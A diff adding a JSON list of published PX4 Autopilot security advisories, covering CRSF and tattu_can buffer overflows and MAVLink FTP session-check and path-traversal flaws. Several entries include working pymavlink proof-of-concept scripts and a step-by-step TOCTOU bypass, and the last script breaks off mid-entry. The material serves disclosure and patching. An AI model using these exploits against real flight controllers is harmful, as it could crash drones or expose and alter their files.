@@ -1,0 +1,1783 @@
+[
+  {
+    "ghsa_id": "GHSA-mqgj-hh4g-fg5p",
+    "cve_id": "CVE-2026-32706",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-mqgj-hh4g-fg5p",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-mqgj-hh4g-fg5p",
+    "summary": "Global buffer overflow in crsf_rc via oversized variable-length known packet",
+    "description": "### Summary\r\nThe `crsf_rc` parser accepts an oversized variable-length known packet and copies it into a fixed 64-byte global buffer without a bounds check. In deployments where `crsf_rc` is enabled on a CRSF serial port, an adjacent/raw-serial attacker can trigger memory corruption and crash PX4.\r\n\r\n### Details\r\nThe issue is in `src/drivers/rc/crsf_rc`.\r\n\r\n`crsf_rc` uses a fixed parser scratch buffer:\r\n- `process_buffer[64]` in `src/drivers/rc/crsf_rc/CrsfParser.cpp`\r\n\r\nIt also treats `CRSF_PACKET_TYPE_ELRS_STATUS` as a known variable-length packet:\r\n- `CRSF_PAYLOAD_SIZE_ELRS_STATUS = -1`\r\n\r\nIn the parser state machine, variable-length known packets do not pass through the same maximum-length rejection used for unknown packet types. The parser then copies `working_index + CRC_SIZE` bytes into `process_buffer` through `QueueBuffer_PeekBuffer()`, which performs an unchecked `memcpy` into the destination buffer.\r\n\r\nThis allows an oversized known packet to overflow `process_buffer` before CRC validation completes.\r\n\r\nRelevant code locations:\r\n- `src/drivers/rc/crsf_rc/CrsfParser.cpp:56`\r\n- `src/drivers/rc/crsf_rc/CrsfParser.cpp:67`\r\n- `src/drivers/rc/crsf_rc/CrsfParser.cpp:138`\r\n- `src/drivers/rc/crsf_rc/CrsfParser.cpp:399`\r\n- `src/drivers/rc/crsf_rc/CrsfParser.cpp:445`\r\n- `src/drivers/rc/crsf_rc/QueueBuffer.cpp:153`\r\n\r\n### PoC\r\nAn integrated Docker-based reproduction environment is included under `security-lab/crsf_rc`.\r\n\r\nSteps:\r\n```bash\r\ncd security-lab/crsf_rc\r\n./run.sh\r\n```\r\n\r\nWhat the lab does:\r\n- builds a real PX4 SITL binary with ASAN\r\n- starts a real PX4 daemon\r\n- starts the real `crsf_rc` module against a PTY-backed serial device\r\n- injects a crafted oversized `ELRS_STATUS` frame through the PTY master\r\n- extracts the in-container logs and validates the resulting ASAN crash\r\n\r\nExpected evidence in `logs/px4_crsf_rc_integration.log`:\r\n- `AddressSanitizer`\r\n- `global-buffer-overflow`\r\n- `QueueBuffer.cpp:153`\r\n- `CrsfParser.cpp:445`\r\n\r\nConfirmed result:\r\n- `logs/crsf_rc_result.env` contains `triggered=true`\r\n\r\nTest-environment note:\r\n- The integrated reproduction uses a POSIX PTY as a stand-in for the CRSF UART path.\r\n- A small `LD_PRELOAD` baud shim is used only because the host PTY environment cannot open the requested `420000` baud setting directly.\r\n- In practical terms, this reproduces the software-equivalent of an attacker being physically connected to the drone's CRSF UART path and injecting raw serial bytes into the real `crsf_rc` driver.\r\n- The vulnerable PX4 parser logic is unchanged. The shim only adapts the PTY baud setup used for the lab.\r\n\r\n### Impact\r\n- Vulnerability type: global/static buffer overflow\r\n- Primary impact: denial of service through PX4 process crash\r\n- Secondary impact: memory corruption and undefined behavior\r\n\r\nAttack surface:\r\n- This is not an internet-routable network issue.\r\n- The realistic attacker model is an adjacent/raw-serial attacker that can inject bytes on the CRSF UART path, such as:\r\n  - a malicious CRSF/ExpressLRS receiver\r\n  - a UART man-in-the-middle device between receiver and flight controller\r\n  - a compromised external peripheral on the same serial path\r\n- This report does not claim a pure RF-only unauthenticated remote exploit against standard CRSF equipment.\r\n\r\n### Attachment\r\n[security-lab_crsf_rc_20260312_204136.zip](https://github.com/user-attachments/files/25933835/security-lab_crsf_rc_20260312_204136.zip)",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-mqgj-hh4g-fg5p",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32706",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-04-07T03:06:08Z",
+    "published_at": "2026-03-13T19:56:16Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "< 1.17.0-rc2",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+        "score": 7.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-120",
+        "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')"
+      },
+      {
+        "cwe_id": "CWE-787",
+        "name": "Out-of-bounds Write"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-120",
+      "CWE-787"
+    ],
+    "credits": [
+      {
+        "login": "kmm2003",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "kmm2003",
+          "id": 69188747,
+          "node_id": "MDQ6VXNlcjY5MTg4NzQ3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/69188747?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kmm2003",
+          "html_url": "https://github.com/kmm2003",
+          "followers_url": "https://api.github.com/users/kmm2003/followers",
+          "following_url": "https://api.github.com/users/kmm2003/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kmm2003/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kmm2003/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kmm2003/subscriptions",
+          "organizations_url": "https://api.github.com/users/kmm2003/orgs",
+          "repos_url": "https://api.github.com/users/kmm2003/repos",
+          "events_url": "https://api.github.com/users/kmm2003/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kmm2003/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+      "score": 7.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-wxwm-xmx9-hr32",
+    "cve_id": "CVE-2026-32707",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-wxwm-xmx9-hr32",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-wxwm-xmx9-hr32",
+    "summary": "Stack buffer overflow in tattu_can due to unbounded memcpy in frame assembly loop",
+    "description": "### Summary\r\n`tattu_can` contains an unbounded `memcpy` in its multi-frame assembly loop, allowing stack memory overwrite when crafted CAN frames are processed.  \r\nIn deployments where `tattu_can` is enabled and running, a CAN-injection-capable attacker can trigger a crash (DoS) and memory corruption.\r\n\r\n### Details\r\nThe vulnerable code is in `src/drivers/tattu_can/TattuCan.cpp` (assembly logic around line 114):\r\n\r\n- `offset` starts at 5.\r\n- For each subsequent frame, `payload_size = received_frame.payload_size - 1`.\r\n- Data is copied with:\r\n  `memcpy(((char *)&tattu_message) + offset, received_frame.payload, payload_size);`\r\n- There is no bounds check enforcing:\r\n  `offset + payload_size <= sizeof(Tattu12SBatteryMessage)`.\r\n\r\nAs a result, repeated crafted frames overflow the stack object `tattu_message`.\r\n\r\nOperational condition:\r\n- `tattu_can` must be compiled and started (`CONFIG_DRIVERS_TATTU_CAN=y` + `tattu_can start`).\r\n- This is typically vendor/custom firmware specific (not commonly enabled in default upstream builds).\r\n\r\n### PoC\r\nIntegrated reproduction was performed with real PX4 runtime in Docker (not copied vulnerable snippet testing).\r\n\r\nReproduction files:\r\n- `security-lab/Dockerfile`\r\n- `security-lab/container_run.sh`\r\n- `security-lab/poc/tattu_can_can_injector.c`\r\n- `security-lab/run.sh`\r\n\r\nSteps:\r\n```bash\r\ncd security-lab\r\n./run.sh\r\n```\r\n\r\n### Attachment\r\n[security-lab_20260311_200146.zip](https://github.com/user-attachments/files/25899417/security-lab_20260311_200146.zip)",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-wxwm-xmx9-hr32",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32707",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-04-07T03:06:18Z",
+    "published_at": "2026-03-13T19:50:52Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+        "score": 5.2
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-121",
+        "name": "Stack-based Buffer Overflow"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-121"
+    ],
+    "credits": [
+      {
+        "login": "kmm2003",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "kmm2003",
+          "id": 69188747,
+          "node_id": "MDQ6VXNlcjY5MTg4NzQ3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/69188747?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/kmm2003",
+          "html_url": "https://github.com/kmm2003",
+          "followers_url": "https://api.github.com/users/kmm2003/followers",
+          "following_url": "https://api.github.com/users/kmm2003/following{/other_user}",
+          "gists_url": "https://api.github.com/users/kmm2003/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/kmm2003/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/kmm2003/subscriptions",
+          "organizations_url": "https://api.github.com/users/kmm2003/orgs",
+          "repos_url": "https://api.github.com/users/kmm2003/repos",
+          "events_url": "https://api.github.com/users/kmm2003/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/kmm2003/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 2,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+      "score": 5.2
+    }
+  },
+  {
+    "ghsa_id": "GHSA-pp2c-jr5g-6f2m",
+    "cve_id": "CVE-2026-32713",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-pp2c-jr5g-6f2m",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-pp2c-jr5g-6f2m",
+    "summary": "PX4 Autopilot MAVLink FTP Session Validation Logic Error Allows Operations on Invalid File Descriptors",
+    "description": "### Summary\r\n\r\nA logic error in the PX4 Autopilot MAVLink FTP session validation uses incorrect boolean logic (`&&` instead of `||`), allowing `BurstReadFile` and `WriteFile` operations to proceed with invalid sessions or closed file descriptors. This enables an unauthenticated attacker to put the FTP subsystem into an inconsistent state, trigger operations on invalid file descriptors, and bypass session isolation checks. CVSS 6.5 Medium.\r\n\r\n### Details\r\n\r\nThe vulnerability is a straightforward logic error in `src/modules/mavlink/mavlink_ftp.cpp` where two functions use `&&` (logical AND) instead of `||` (logical OR) for session validation, diverging from the correct implementation used in a third function.\r\n\r\n**1. Correct implementation in `_workRead` (`mavlink_ftp.cpp:559`)**\r\n\r\nThe `_workRead` function correctly rejects requests when *either* the session ID is wrong *or* the file descriptor is invalid:\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:559 -- CORRECT: uses || (logical OR)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workRead(PayloadHeader *payload)\r\n{\r\n    if (payload->session != 0 || _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // ... proceeds with read\r\n}\r\n```\r\n\r\nTruth table for `||`:\r\n| `session != 0` | `fd < 0` | Result | Correct? |\r\n|:-:|:-:|:-:|:-:|\r\n| false | false | **PASS** (valid session, valid fd) | Yes |\r\n| false | true | **REJECT** (valid session, no fd) | Yes |\r\n| true | false | **REJECT** (wrong session, valid fd) | Yes |\r\n| true | true | **REJECT** (wrong session, no fd) | Yes |\r\n\r\n**2. Buggy implementation in `_workBurst` (`mavlink_ftp.cpp:597`)**\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:597 -- BUG: uses && (logical AND)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workBurst(PayloadHeader *payload, uint8_t target_system_id, uint8_t target_component_id)\r\n{\r\n    if (payload->session != 0 && _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // Setup for streaming sends\r\n    _session_info.stream_download = true;\r\n    _session_info.stream_offset = payload->offset;\r\n    // ...\r\n}\r\n```\r\n\r\n**3. Buggy implementation in `_workWrite` (`mavlink_ftp.cpp:618`)**\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:618 -- BUG: uses && (logical AND)\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workWrite(PayloadHeader *payload)\r\n{\r\n    if (payload->session != 0 && _session_info.fd < 0) {\r\n        return kErrInvalidSession;\r\n    }\r\n    // ...\r\n    if (lseek(_session_info.fd, payload->offset, SEEK_SET) < 0) {\r\n        // ...\r\n    }\r\n    int bytes_written = ::write(_session_info.fd, &payload->data[0], payload->size);\r\n    // ...\r\n}\r\n```\r\n\r\nTruth table for `&&`:\r\n| `session != 0` | `fd < 0` | Result | Correct? |\r\n|:-:|:-:|:-:|:-:|\r\n| false | false | **PASS** (valid session, valid fd) | Yes |\r\n| false | true | **PASS** (valid session, no fd) | **NO -- should reject** |\r\n| true | false | **PASS** (wrong session, valid fd) | **NO -- should reject** |\r\n| true | true | **REJECT** (wrong session, no fd) | Yes |\r\n\r\n**Exploitable scenarios:**\r\n\r\n**Scenario A: Operations on closed file descriptor (session=0, fd=-1)**\r\n- Default state: `session=0`, `_session_info.fd=-1` (no file open)\r\n- Attacker sends `kCmdBurstReadFile` with `session=0`\r\n- Check: `0 != 0 && -1 < 0` → `false && true` → `false` → **check bypassed**\r\n- Code sets `_session_info.stream_download = true` with fd=-1\r\n- `send()` later attempts `lseek` and `read` on fd=-1\r\n- FTP enters an inconsistent streaming state\r\n\r\n**Scenario B: Session ID isolation bypass (session!=0, fd>=0)**\r\n- A file has been opened (fd is valid, assigned to session 0)\r\n- Attacker sends `kCmdBurstReadFile` or `kCmdWriteFile` with `session=5`\r\n- Check: `5 != 0 && fd >= 0` → `true && false` → `false` → **check bypassed**\r\n- Operation proceeds on the file from session 0 despite wrong session ID\r\n- Session IDs provide no isolation\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n- MAVLink communication channel to a PX4 flight controller\r\n- Python with `pymavlink`\r\n\r\n**Reproducing Scenario A (burst read on invalid fd):**\r\n\r\n```python\r\nfrom pymavlink import mavutil\r\nimport struct, time\r\n\r\nmav = mavutil.mavlink_connection('udp:127.0.0.1:14540')\r\nmav.wait_heartbeat()\r\n\r\nTARGET_SYS = mav.target_system\r\nTARGET_COMP = mav.target_component\r\n\r\ndef make_ftp_payload(seq, session, opcode, size, offset, data=b''):\r\n    \"\"\"Build FTP PayloadHeader + data.\"\"\"\r\n    header = struct.pack('<HBBBBBxI', seq, session, opcode, size, 0, 0, offset)\r\n    return header + data\r\n\r\n# Do NOT open any file first -- fd should be -1\r\n\r\n# Send kCmdBurstReadFile (opcode=15) with session=0\r\n# With the bug, this bypasses the session check because:\r\n#   session(0) != 0 --> false\r\n#   fd(-1) < 0 --> true\r\n#   false && true --> false --> check skipped!\r\npayload = make_ftp_payload(seq=1, session=0, opcode=15, size=0, offset=0)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\n\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(1)\r\n\r\n# The FTP subsystem is now in stream_download mode with fd=-1\r\n# Subsequent send() calls will attempt lseek/read on fd=-1 and generate errors\r\n# This can be confirmed by monitoring PX4 debug output for \"seek fail\" or EBADF errors\r\n\r\n# Receive response\r\nmsg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\nif msg:\r\n    resp = bytes(msg.payload)\r\n    opcode = resp[3]\r\n    if opcode == 128:  # kRspAck\r\n        print(\"[!] BUG CONFIRMED: Burst accepted without open file (fd=-1)\")\r\n    elif opcode == 129:  # kRspNak\r\n        error = resp[12]\r\n        print(f\"[*] NAK received, error code: {error}\")\r\n        # If error 4 (kErrInvalidSession), the bug is NOT present (patched)\r\n        # If error 2 (kErrFailErrno), the bug IS present (EBADF from lseek on fd=-1)\r\n```\r\n\r\n**Reproducing Scenario B (session ID bypass):**\r\n\r\n```python\r\n# Step 1: Open a file normally (session=0)\r\npath = b'/fs/microsd/log\\x00'  # or any valid path\r\npayload = make_ftp_payload(seq=0, session=0, opcode=4, size=len(path), offset=0, data=path)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(0.5)\r\n\r\n# Step 2: Send burst read with WRONG session ID (session=5)\r\n# With the bug: session(5) != 0 --> true, fd(N) < 0 --> false\r\n#   true && false --> false --> check bypassed!\r\n# Operation proceeds on session 0's file despite requesting session 5\r\npayload = make_ftp_payload(seq=1, session=5, opcode=15, size=0, offset=0)\r\nftp_msg = bytearray(251)\r\nftp_msg[:len(payload)] = payload\r\nmav.mav.file_transfer_protocol_send(0, TARGET_SYS, TARGET_COMP, ftp_msg)\r\ntime.sleep(1)\r\n\r\nmsg = mav.recv_match(type='FILE_TRANSFER_PROTOCOL', blocking=True, timeout=5)\r\nif msg:\r\n    resp = bytes(msg.payload)\r\n    opcode = resp[3]\r\n    if opcode == 128:  # kRspAck\r\n        print(\"[!] BUG CONFIRMED: Wrong session ID accepted, reading from session 0's file\")\r\n```\r\n\r\n### Impact\r\n\r\nThis is a **logic error vulnerability** that breaks the session validation in the MAVLink FTP protocol implementation.\r\n\r\n**Who is impacted:**\r\n- All PX4 deployments using MAVLink FTP (file transfer, parameter upload, log download)\r\n- Ground control stations that rely on session semantics for concurrent FTP operations\r\n\r\n**What an attacker can do:**\r\n- Trigger FTP operations on invalid file descriptors, causing the subsystem to enter inconsistent state\r\n- Bypass session ID isolation, accessing files opened in other sessions\r\n- Put the FTP subsystem into stream download mode with no valid file, potentially blocking other FTP operations\r\n- Trigger error code paths (EBADF from lseek/read/write on fd=-1) that may have unintended side effects\r\n\r\n**Limitations:**\r\n- Operations on fd=-1 will fail at the syscall level (EBADF), limiting data exfiltration\r\n- PX4 currently only supports one session (session 0), so session isolation bypass has limited practical impact\r\n- The primary risk is denial of service to the FTP subsystem and triggering of unexpected error paths",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-pp2c-jr5g-6f2m",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-32713",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-03-13T19:53:10Z",
+    "published_at": "2026-03-13T19:53:10Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "PX4/PX4-Autopilot"
+        },
+        "vulnerable_version_range": "<= 1.17.0-rc1",
+        "patched_versions": "1.17.0-rc2",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 4.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-670",
+        "name": "Always-Incorrect Control Flow Implementation"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-670"
+    ],
+    "credits": [
+      {
+        "login": "dxlerYT",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "dxlerYT",
+          "id": 73416867,
+          "node_id": "MDQ6VXNlcjczNDE2ODY3",
+          "avatar_url": "https://avatars.githubusercontent.com/u/73416867?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/dxlerYT",
+          "html_url": "https://github.com/dxlerYT",
+          "followers_url": "https://api.github.com/users/dxlerYT/followers",
+          "following_url": "https://api.github.com/users/dxlerYT/following{/other_user}",
+          "gists_url": "https://api.github.com/users/dxlerYT/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/dxlerYT/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/dxlerYT/subscriptions",
+          "organizations_url": "https://api.github.com/users/dxlerYT/orgs",
+          "repos_url": "https://api.github.com/users/dxlerYT/repos",
+          "events_url": "https://api.github.com/users/dxlerYT/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/dxlerYT/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 3,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 4.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-fh32-qxj9-x32f",
+    "cve_id": "CVE-2026-32709",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-fh32-qxj9-x32f",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-fh32-qxj9-x32f",
+    "summary": "PX4 Autopilot MAVLink FTP Unauthenticated Path Traversal (Arbitrary File Read/Write/Delete)",
+    "description": "### Summary\r\n\r\nAn unauthenticated path traversal vulnerability in the PX4 Autopilot MAVLink FTP implementation allows any MAVLink peer to read, write, create, delete, and rename arbitrary files on the flight controller filesystem without authentication. On NuttX targets, the FTP root directory is an empty string, meaning attacker-supplied paths are passed directly to filesystem syscalls with no prefix or sanitization for read operations. On POSIX targets (Linux companion computers, SITL), the write-path validation function unconditionally returns `true`, providing no protection. A TOCTOU race condition in the write validation on NuttX further allows bypassing the only existing guard. CVSS 9.8 Critical.\r\n\r\n### Details\r\n\r\nThe vulnerability exists in multiple interacting components of `src/modules/mavlink/mavlink_ftp.cpp` and `src/modules/mavlink/mavlink_ftp.h`.\r\n\r\n**1. Empty root directory on NuttX (`mavlink_ftp.h:202-209`)**\r\n\r\nThe FTP root directory is set to `PX4_ROOTFSDIR`, which on NuttX is defined as `\"\"` (empty string) in `platforms/common/include/px4_platform_common/defines.h:66`:\r\n\r\n```cpp\r\n// mavlink_ftp.h:207\r\nstatic constexpr const char _root_dir[] = PX4_ROOTFSDIR;  // \"\" on NuttX\r\nstatic constexpr const int _root_dir_len = sizeof(_root_dir) - 1;  // 0\r\n```\r\n\r\nThe developers acknowledge this in a source code comment at `mavlink_ftp.h:203`:\r\n```cpp\r\n// Note that requests can still fall outside of the root dir by using ../..\r\n```\r\n\r\n**2. No path validation on read operations (`mavlink_ftp.cpp:361-500, 502-553`)**\r\n\r\nThe read-path operations (`_workList`, `_workOpen` with `O_RDONLY`, `_workRead`, `_workBurst`, `_workCalcFileCRC32`) never call `_validatePathIsWritable`. They call only `_constructPath`, which prepends the (empty) root directory and does no canonicalization or traversal filtering:\r\n\r\n```cpp\r\n// mavlink_ftp.cpp:504-536 -- _workOpen: NO path validation for ANY open mode\r\nMavlinkFTP::ErrorCode\r\nMavlinkFTP::_workOpen(PayloadHeader *payload, int oflag)\r\n{\r\n    if (_session_info.fd >= 0) {\r\n        return kErrNoSessionsAvailable;\r\n    }\r\n    _constructPath(_work_buffer1, _work_buffer1_len, _data_as_cstring(payload));\r\n    // ... no _validatePathIsWritable call ...\r\n    int fd = ::open(_work_buffer1, oflag, PX4_O_MODE_666);  // Opens attacker-controlled path\r\n}\r\n```\r\n\r\n**3. Write validation disabled on POSIX (`mavlink_ftp.cpp:1150-1164`)**\r\n\r\nThe `_validatePathIsWritable` function is compiled out on all non-NuttX platforms:\r\n\r\n```cpp\r\nbool MavlinkFTP::_validatePathIsWritable(const char *path)\r\n{\r\n#ifdef __PX4_NUTTX\r\n    if (strncmp(path, CONFIG_BOARD_ROOT_PATH \"/\", 12) != 0 || strstr(path, \"/../\") != nullptr) {\r\n        return false;\r\n    }\r\n#endif\r\n    return true;  // <-- Unconditionally returns true on POSIX (Linux, macOS)\r\n}\r\n```\r\n\r\n**4. TOCTOU bypass of NuttX write validation (`mavlink_ftp.cpp:511, 623, 363`)**\r\n\r\nOn NuttX, write validation occurs in `_workWrite` (line 623) but NOT in `_workOpen` (line 511). Both share `_work_buffer1`, which is overwritten by any intervening operation such as `_workList` (line 363). An attacker can:\r\n\r\n1. `kCmdCreateFile` with malicious path -> `_workOpen` creates file at attacker path (no validation), stores path in `_work_buffer1`\r\n2. `kCmdListDirectory` with safe path -> `_workList` overwrites `_work_buffer1` with safe path\r\n3. `kCmdWriteFile` -> `_workWrite` validates `_work_buffer1` (safe path) -> passes -> writes to malicious fd from step 1\r\n\r\n**5. No authentication (`mavlink_ftp.cpp:135-136`)**\r\n\r\nThe FTP handler accepts messages from any system with matching or broadcast (0) target IDs:\r\n\r\n```cpp\r\nif ((ftp_request.target_system == _getServerSystemId() || ftp_request.target_system == 0) &&\r\n    (ftp_request.target_component == _getServerComponentId() || ftp_request.target_component == 0)) {\r\n    _process_request(&ftp_request, msg->sysid, msg->compid);\r\n}\r\n```\r\n\r\n### PoC\r\n\r\n**Prerequisites:**\r\n- MAVLink communication channel to a PX4 flight controller (serial/USB/UDP/TCP)\r\n- A MAVLink-capable tool such as `pymavlink`\r\n\r\n**Reproducing arbitrary file read on NuttX:**\r\n\r\n```python\r\nfrom pymavlink import mavutil\r\nimport struct, time\r\n\r\n# Connect to PX4 (adjust connection string)\r\nmav = mavutil.mavlink_connection('udp:127.0.0.1:14540')\r\nmav.wait_heartbeat()\r\n\r\nTARGET_SYSTEM = mav.target_system\r\nTARGET_COMPONENT = mav.target_component\r\n\r\ndef make_payload(seq, session, 